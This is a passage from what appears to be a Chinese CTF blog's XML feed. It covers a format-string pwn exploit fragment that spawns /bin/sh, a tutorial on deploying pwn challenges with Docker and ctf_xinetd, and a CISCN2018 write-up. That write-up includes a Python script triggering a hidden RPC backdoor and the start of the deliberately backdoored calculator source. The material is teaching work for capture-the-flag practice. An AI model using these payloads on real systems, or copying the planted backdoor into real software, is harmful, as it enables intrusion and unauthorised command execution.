<span class="token keyword">break</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ÊúâÁÇπÊáµÔºåÂ•ΩÂ•ΩÊ∂àÂåñ„ÄÇ</p><p>ÂéüÊù•ÂêÑÂ§ÑÁöÑ&amp;ffffÔºå‰∏çÂçïÂçïÊòØ‰∏∫‰∫ÜÂåπÈÖçÂêéÈù¢ÁöÑ%$hnËß£ÂºïÁî®ÂÜô‰∏§‰∏™Â≠óËäÇÔºåËÄåÊòØÔºåËøôÁßçÂÜôÁöÑÊñπÂºèÂπ∂‰∏çÊòØË¶ÜÁõñÔºåËÄåÊòØÂ∞ÜÊâÄÊåáÂÆöÁöÑÂÜÖÂ≠òÁ©∫Èó¥ÁöÑÂâç‰∏§‰∏™Â≠óËäÇÊç¢ÊàêÊàë‰ª¨Ë¶ÅÂÜôÁöÑÂÄº„ÄÇ</p><p>Â¶Ç<code>&quot;%&quot;+str(p_11&amp;0xffff)+&quot;c%6$hn\x00&quot;</code>ÔºåÂàôË°®Á§∫Â∞ÜÂêëÊ†àÁ©∫Èó¥ÂÅèÁßªÈáè6ÁöÑ‰ΩçÁΩÆÁöÑÂâç‰∏§‰∏™Â≠óËäÇÂÜôÊàê<code>p_11&amp;0xffff</code>ÔºåÂç≥ÂéüÊï∞ÊçÆËã•‰∏∫<code>0x12345678</code>ÔºåÁªèËøáÊìç‰ΩúÂêéÂèò‰∏∫‰∫Ü<code>0x12340000+p_11&amp;0xffff</code>„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> ‰∫åËøõÂà∂ÂÆâÂÖ® </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>‰ΩøÁî®DockerËøõË°åPwnÈ¢òÁéØÂ¢ÉÈÉ®ÁΩ≤</title>
      <link href="/2018/10/30/Pwn%E9%A2%98%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
      <url>/2018/10/30/Pwn%E9%A2%98%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="‰ΩøÁî®DockerËøõË°åPwnÈ¢òÁéØÂ¢ÉÈÉ®ÁΩ≤"><a href="#‰ΩøÁî®DockerËøõË°åPwnÈ¢òÁéØÂ¢ÉÈÉ®ÁΩ≤" class="headerlink" title="‰ΩøÁî®DockerËøõË°åPwnÈ¢òÁéØÂ¢ÉÈÉ®ÁΩ≤"></a>‰ΩøÁî®DockerËøõË°åPwnÈ¢òÁéØÂ¢ÉÈÉ®ÁΩ≤</h1><blockquote><p>üòÑdockerÊòØ‰∏™Â•Ω‰∏úË•øÔºåÂú®CTFÊØîËµõ‰∏≠Êàë‰ª¨ÂèØ‰ª•ÁªèÂ∏∏ÈÅáÂà∞ÈÄöËøádockerÈÉ®ÁΩ≤ÁöÑwebÔºåÊàñËÄÖPwnÁéØÂ¢ÉÔºåÂêåÊ†∑Êàë‰ª¨‰πüÂèØ‰ª•Â∞Ü‰∏Ä‰∫õÊúçÂä°ÈÉ®ÁΩ≤Âú®dockerÈáåÈù¢ÔºåÁÆ°ÁêÜÊñπ‰æøÔºåÂπ∂‰∏îËæÉ‰∏∫ÂÆâÂÖ®„ÄÇ</p><p>ÈÄöËøádockerÊàë‰ª¨ÂèØ‰ª•Ëá™Â∑±ÂàõÂª∫ÈïúÂÉèÔºåÊàñËÄÖÊãâÂèñÈïúÂÉèÔºåÊØîÂ¶ÇËØ¥<a href="http://vulapps.evalbug.com/" target="_blank" rel="noopener">vulapps</a>‰∏äÈù¢ÁöÑÈù∂Êú∫ÔºåËøòÊúâËøôÊ¨°Ë¶ÅËÆ≤ÁöÑÁÆÄÂçïÁöÑPwnÁéØÂ¢ÉÈÉ®ÁΩ≤Ê°ÜÊû∂„ÄÇ</p><p>ËøôÈáåÊúâAngel_kittyÂ∏àÂÇÖÂÜôÁöÑ‰∏Ä‰ªΩË∂ÖËØ¶ÁªÜdockerÊïôÁ®ã„ÄÇ<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9789130.html" target="_blank" rel="noopener">‰º†ÈÄÅÈó®</a></p></blockquote><h2 id="Docker-ÂÆâË£Ö"><a href="#Docker-ÂÆâË£Ö" class="headerlink" title="Docker ÂÆâË£Ö"></a>Docker ÂÆâË£Ö</h2><h3 id="1-aptÂÆâË£Ö"><a href="#1-aptÂÆâË£Ö" class="headerlink" title="1.aptÂÆâË£Ö"></a>1.aptÂÆâË£Ö</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> docker docker-compose</code></pre><h3 id="2-ÊâãÂä®‰∏ãËΩΩÂπ∂‰∏îÂÆâË£Ö"><a href="#2-ÊâãÂä®‰∏ãËΩΩÂπ∂‰∏îÂÆâË£Ö" class="headerlink" title="2.ÊâãÂä®‰∏ãËΩΩÂπ∂‰∏îÂÆâË£Ö"></a>2.ÊâãÂä®‰∏ãËΩΩÂπ∂‰∏îÂÆâË£Ö</h3><p><a href="https://download.docker.com/linux/debian/dists/" target="_blank" rel="noopener">‰∏ãËΩΩÈìæÊé•</a></p><p>‰∏ãËΩΩÂÆåÊàêÂêéËøõÂÖ•ÂÆâË£ÖÊä•ÊâÄÂú®ÁöÑÁõÆÂΩïÔºåÂπ∂‰∏îÊâßË°å‰∏Ä‰∏ãÂëΩ‰ª§ËøõË°åÂÆâË£ÖÔºö</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#dbkg -i filename</span>dpkg -i docker-ce_17.03.1~ce-0~debian-jessie_amd64.deb</code></pre><h3 id="3-ÂàáÊç¢ÈïúÂÉèÊ∫ê"><a href="#3-ÂàáÊç¢ÈïúÂÉèÊ∫ê" class="headerlink" title="3.ÂàáÊç¢ÈïúÂÉèÊ∫ê"></a>3.ÂàáÊç¢ÈïúÂÉèÊ∫ê</h3><p>vim /etc/docker/daemon.json</p><pre class=" language-shell"><code class="language-shell">cat > /etc/docker/daemon.json << EOF{  "registry-mirrors": ["https://docker.mirrors.ustc.edu.cn"]}EOFservice docker restart</code></pre><h2 id="Docker-ÁÆÄÂçï‰ΩøÁî®"><a href="#Docker-ÁÆÄÂçï‰ΩøÁî®" class="headerlink" title="Docker ÁÆÄÂçï‰ΩøÁî®"></a>Docker ÁÆÄÂçï‰ΩøÁî®</h2><p>Êàë‰ª¨ÂèØ‰ª•ÈÄöËøá‰ª•‰∏ãÂá†Êù°ÂëΩ‰ª§ÁÆÄÂçïÊµãËØï‰∏Ä‰∏ãdockerÊòØÂê¶ÂÆâË£ÖÊàêÂäüÔºö</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#ÂêØÂä®docker</span><span class="token function">service</span> docker startdocker images<span class="token comment" spellcheck="true">#hello-world‰∏∫ÂÖ∂Ëá™Â∏¶ÁöÑ‰∏Ä‰∏™image</span>docker run hello-world</code></pre><p>‰ª•Âèä‰∏Ä‰∫õÂ∏∏Áî®ÁöÑÂëΩ‰ª§ÔºåÂèØ‰ª•ËÆ∞ÂΩï‰∏Ä‰∏ãÔºö</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#Êü•ÁúãÊú¨Âú∞Â∑≤ÊúâÈïúÂÉè</span>docker images<span class="token comment" spellcheck="true">#ËøêË°åÈïúÂÉèÂπ∂ËøõÂÖ•</span>docker run -i -t httpd /bin/bash<span class="token comment" spellcheck="true">#ÂêéÂè∞ËøêË°åÈïúÂÉèÔºåÈïúÂÉè8080Á´ØÂè£Êò†Â∞ÑÂà∞‰∏ªÊú∫80Á´ØÂè£</span>docker run -d -p 80:8080 httpd<span class="token comment" spellcheck="true">#ËøõÂÖ•Â∑≤ÊúâÂÆπÂô®</span>docker <span class="token function">exec</span> -it <span class="token punctuation">[</span>container-id<span class="token punctuation">]</span> /bin/bash<span class="token comment" spellcheck="true">#ÂÖ≥Èó≠ÈïúÂÉè</span>docker stop httpd<span class="token comment" spellcheck="true">#Êü•ÁúãÂΩìÂâçÊ≠£Âú®ËøêË°åÁöÑÈïúÂÉè</span>docker <span class="token function">ps</span>„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ</code></pre><h1 id="PwnÈÉ®ÁΩ≤Ê°ÜÊû∂"><a href="#PwnÈÉ®ÁΩ≤Ê°ÜÊû∂" class="headerlink" title="PwnÈÉ®ÁΩ≤Ê°ÜÊû∂"></a>PwnÈÉ®ÁΩ≤Ê°ÜÊû∂</h1><blockquote><p>ÈÄöËøáÊ°ÜÊû∂Êàë‰ª¨ÂèØ‰ª•Âø´ÈÄüÂú∞ÈÉ®ÁΩ≤PwnÈ¢òÁéØÂ¢ÉÔºåËÄå‰∏çÁî®ÊìçÂ§™Â§öÁöÑÂøÉüíó„ÄÇ</p></blockquote><h2 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf_xinetd"></a>ctf_xinetd</h2><p>Êàë‰ª¨ÂèØ‰ª•‰ªégithub‰∏ä‰∏ãËΩΩÂà∞<a href="https://github.com/Eadom/ctf_xinetd" target="_blank" rel="noopener">ctf_xinetd</a> ÔºåÂÆÉÊòØÂºÄÊ∫êÁöÑ‰∏Ä‰∏™È°πÁõÆ„ÄÇ</p><blockquote><p>#README.md</p><blockquote><p>A docker repository for deploying CTF challenges</p></blockquote><h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><p>Put files to floder <code>bin</code>. They‚Äôll be copied to /home/ctf. <strong>Update the flag</strong> at the same time.</p><p>Edit <code>ctf.xinetd</code>. replace <code>./helloworld</code> to your command.</p><p>You can also edit <code>Dockerfile, ctf.xinetd, start.sh</code> to custom your environment.</p><h2 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h2><pre class=" language-bash"><code class="language-bash">docker build -t <span class="token string">"helloworld"</span> <span class="token keyword">.</span></code></pre><p>DO NOT use <em>bin</em> as challenge‚Äôs name</p><h2 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h2><pre class=" language-bash"><code class="language-bash">docker run -d -p <span class="token string">"0.0.0.0:pub_port:9999"</span> -h <span class="token string">"helloworld"</span> --name<span class="token operator">=</span><span class="token string">"helloworld"</span> helloworld</code></pre><p><code>pub_port</code> is the port you want to expose to the public network.</p><h2 id="Capture-traffic"><a href="#Capture-traffic" class="headerlink" title="Capture traffic"></a>Capture traffic</h2><p>If you want to capture challenge traffic, just run <code>tcpdump</code> on the host. Here is an example.</p><pre class=" language-bash"><code class="language-bash">tcpdump -w helloworld.pcap -i eth0 port pub_port</code></pre></blockquote><p>ÂÖàÁÆÄÂçïÂú∞Áúã‰∏Ä‰∏ãÂÆÉÁöÑÁõÆÂΩïÁªìÊûÑÔºö</p><p><img src="https://i.loli.net/2018/10/30/5bd87b591ea60.png" alt=""></p><p>È¶ñÂÖàÂ∞ÜÈ°πÁõÆ‰∏ãËΩΩÂà∞Êú¨Âú∞ÔºåÂπ∂‰∏îÂ∞ÜÂáÜÂ§áÂ•ΩÁöÑpwnÈ¢òÂíåflagÊîæÂÖ•binÊñá‰ª∂Â§π‰∏≠„ÄÇ<br><img src="https://i.loli.net/2018/10/30/5bd87ba1360b7.png" alt=""></p><p>ÁÑ∂ÂêéÊàë‰ª¨Âéª‰øÆÊîπctf.xinetdÊñá‰ª∂‰∏≠ÁöÑÈÖçÁΩÆÂèÇÊï∞Ôºö</p><p><img src="https://i.loli.net/2018/10/30/5bd87bda03b20.png" alt=""></p><p>ÁÑ∂ÂêéÊ†πÊçÆreadmeÊñáÊ°£Êàë‰ª¨ÂèØ‰ª•ËøõË°ådockerÂÆπÂô®ÁöÑÂª∫Á´ãÔºåËøêË°åÔºå‰πÉËá≥ÊµÅÈáèÁöÑÁõëÂê¨„ÄÇ</p><h1 id="ÂõΩËµõPwn‰πã‰∏Ä"><a href="#ÂõΩËµõPwn‰πã‰∏Ä" class="headerlink" title="ÂõΩËµõPwn‰πã‰∏Ä"></a>ÂõΩËµõPwn‰πã‰∏Ä</h1><blockquote><p>ËøòËÆ∞Âæó‰ªäÂπ¥ÂõΩËµõÊòØËÆ©ÂêÑÊîØËøõ‰∫ÜÂçäÂÜ≥ËµõÁöÑÈòü‰ºçËøõË°åÂá∫È¢òÔºåÈù∂Ê†áËÆæÁΩÆÔºåËøô‰∏™ÁéØËäÇË¢´Áß∞‰Ωú<code>Built it</code>Ôºå‰ΩÜÊòØÊàë‰ª¨Â§™Ëèú‰∫ÜÔºåÊ≤°ÊúâÂá∫È¢òÔºå‰πüÊ≤°ÊúâÂèÇÂä†ÁöÑÈÇ£‰∏™ÂÆûÂäõÔºåPS:Êàë‰ºöËØ¥ÊàëËøû<a href="https://github.com/sherlly/ciscn2018-pwn/tree/master/checker" target="_blank" rel="noopener">checker</a>ÈÉΩÊ≤°ÁúãÊáÇÂêóÔºåÊõ¥Âà´ËØ¥Ëøáchecker‰∫Ü„ÄÇ</p><p>ÈôÑ‰∏äXp0intÈòü‰ºçÂõΩËµõÂá∫ÁöÑÈ¢òËß£Ôºå‰ª•ÂèäPwnÁéØÂ¢ÉÔºåÂÄü‰ª•ÂèÇËÄÉ„ÄÇ</p></blockquote><blockquote><p>#WP</p><h2 id="CISCN2018-May-be-a-calculator"><a href="#CISCN2018-May-be-a-calculator" class="headerlink" title="CISCN2018 : May be a calculator?"></a>CISCN2018 : May be a calculator?</h2><h2 id="Principle"><a href="#Principle" class="headerlink" title="[Principle]"></a><strong>[Principle]</strong></h2><p>backdoor</p><h2 id="Environment"><a href="#Environment" class="headerlink" title="[Environment]"></a><strong>[Environment]</strong></h2><p>Ubuntu</p><h2 id="Tools"><a href="#Tools" class="headerlink" title="[Tools]"></a><strong>[Tools]</strong></h2><p>gdb„ÄÅobjdump„ÄÅpython„ÄÅpwntools</p><h2 id="Process"><a href="#Process" class="headerlink" title="[Process]"></a><strong>[Process]</strong></h2><p>ËÄÉÂØüRPCÁõ∏ÂÖ≥ÂçèËÆÆÂèäÈ¢ÑÁïôÂêéÈó®ÔºåÈÄöËøáÈÄÜÂêë‰ª£Á†ÅÈÄªËæëÂèØ‰ª•ÁúãÂà∞Âú®Á¨¶Âêàtype‰∏∫0x6Êó∂ÔºåÈöêËóè‰∫Ü‰∏Ä‰∏™ÂêéÈó®ÔºåÂú®ÂêéÈó®ÂáΩÊï∞‰∏≠È¶ñÂÖàÂØπÊé•Êî∂Âà∞ÁöÑkeyËøõË°åÊ£ÄÊü•ÔºåÈÄöËøáÂ∞ÜÂä†ÂØÜÂêéÁöÑkeyÔºàÂä†ÂØÜÁÆóÊ≥ï‰∏∫ÁÆÄÂçïÁöÑÂºÇÊàñÔºâÂíå‰∏Ä‰∏™Âõ∫ÂÆöÂ≠óÁ¨¶‰∏≤ËøõË°åÊØîËæÉÔºåÁõ∏Á≠âÂàôÊé•Êî∂ÁúüÊ≠£ÁöÑpayloadÔºåÂä†ÂØÜÁÆóÊ≥ïÂ¶Ç‰∏ãÔºö</p><pre><code>void encrypt(char* key){  int i;  int k=0;  for(i=0;i&lt;36;i++)  {    key[i]=(key[i]^k)%256;    k+=23;  }}</code></pre><p>ÊúÄÁªàËÑöÊú¨Â¶Ç‰∏ãÔºö<br>exp.py</p><pre><code>from pwn import *import ospayload=&quot;cat flag&quot;key=&quot;12345678-6666-2333-5555-deadbeef1234&quot;backdoor=b&#39;RPCM\x00\x00\x00\x0c\x00\x00\x00\x06&#39;+p32(len(key))[::-1]+key+p32(len(payload))[::-1]+payloadr = remote(&#39;127.0.0.1&#39;, 1337)r.sendline(backdoor)print r.recvline()r.close()</code></pre></blockquote><p>calc.cÁ®ãÂ∫è‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;netdb.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdbool.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;uuid/uuid.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/shm.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;map></span></span><span class="token macro property">#<span class="token directive keyword">define</span> BUF_SIZE 0x100</span><span class="token macro property">#<span class="token directive keyword">define</span> LENGTH 100</span>using namespace std<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> byte<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> top<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pool<span class="token punctuation">[</span>LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> stack<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> Data<span class="token punctuation">{</span>  string corr_id<span class="token punctuation">;</span>  string res<span class="token punctuation">;</span><span class="token punctuation">}</span> Data<span class="token punctuation">;</span><span class="token keyword">typedef</span> queue<span class="token operator">&lt;</span>Data<span class="token operator">></span> Q<span class="token punctuation">;</span><span class="token keyword">typedef</span> map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span> MQ<span class="token punctuation">;</span>map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>iterator it_find<span class="token punctuation">;</span>byte RECV_MAGIC<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'R'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> EVIL_INS<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"1%\x1dqiE\xbd\x99\x95\xf9\xd0\xcb\"\x06pjC\xb4\xb3\x80\xf9\xd6\xcf&lt;LZ7\t\xe6\xfe\xd7\xaf\xd1\xc5=\x11"</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">p32</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> result<span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span>value <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">StrTrim</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> pStr<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pTmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>pTmp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mark <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pStr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">' '</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            pTmp<span class="token punctuation">[</span>mark<span class="token punctuation">]</span> <span class="token operator">=</span> pStr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            mark<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    pTmp<span class="token punctuation">[</span>mark<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> pTmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">myatoi</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf<span class="token punctuation">)</span> <span class="token punctuation">{</span>        sum <span class="token operator">=</span> sum <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf <span class="token operator">-</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        buf<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">read_str</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> t <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span>t <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        buf<span class="token punctuation">[</span>t <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    buf<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> t<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">input_pass</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> c <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'/'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\x00'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'('</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">')'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token number">-1</span><span class="token punctuation">;</span> i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> c1 <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> c2 <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>c1 <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>c2 <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c2 <span class="token 